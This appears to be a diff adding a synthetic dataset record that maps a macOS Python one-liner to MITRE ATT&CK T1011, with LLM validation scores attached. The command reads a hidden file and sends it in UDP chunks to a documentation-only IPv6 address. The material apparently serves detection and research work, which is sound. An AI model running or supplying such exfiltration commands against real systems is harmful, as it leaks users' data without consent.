@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_DGRAM); addr=(\"2001:db8:ab:1::7\", 49160, 0, 0); d=open(\"/Users/Shared/.cache.db\",\"rb\").read(); [s.sendto(d[i:i+900], addr) for i in range(0,len(d),900)]; s.close()'",
+  "explanation": "Exfiltrates data over IPv6 UDP to a high, uncommon port, leveraging a medium (IPv6 datagrams) distinct from typical IPv4/TCP C2. Uses documentation-only IPv6 space to remain safe for lab demonstration and aligns with T1011 by using an alternate network medium.",
+  "rationale_steps": [
+    "Open an IPv6 UDP socket with Python's socket module.",
+    "Select an uncommon destination port (49160) and documentation IPv6 address to avoid real targets.",
+    "Read the file and transmit in chunks via IPv6 datagrams (alternate medium vs common IPv4/TCP).",
+    "No obfuscation applied; user-level privileges only."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-b86667be",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The python3 -c one-liner is balanced and parseable, using valid IPv6 UDP socket creation, tuple addressing, chunked send calls, and proper quoting/separators.",
+        "semantic_score": 2,
+        "semantic_justification": "Although it credibly sends file contents over IPv6/UDP, this maps to alternative protocol use rather than a different network medium per T1011, and the documentation-only IPv6 address is typically unroutable which further limits operational plausibility.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:14:44.362636Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and brackets, proper semicolon separators, and valid Python syntax for socket creation, file reading, and list comprehension.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1011 by exfiltrating data over IPv6 UDP (an alternate network medium from typical IPv4/TCP) to a high port, reading from a hidden file and sending it in chunks, which is operationally plausible for data exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T00:14:50.211155Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced syntax, valid function calls, correct arguments, and proper use of list comprehension for iteration.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of exfiltrating data over IPv6 UDP, a distinct network medium from typical IPv4/TCP, directly aligning with MITRE ATT&CK T1011.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T00:14:59.094941Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
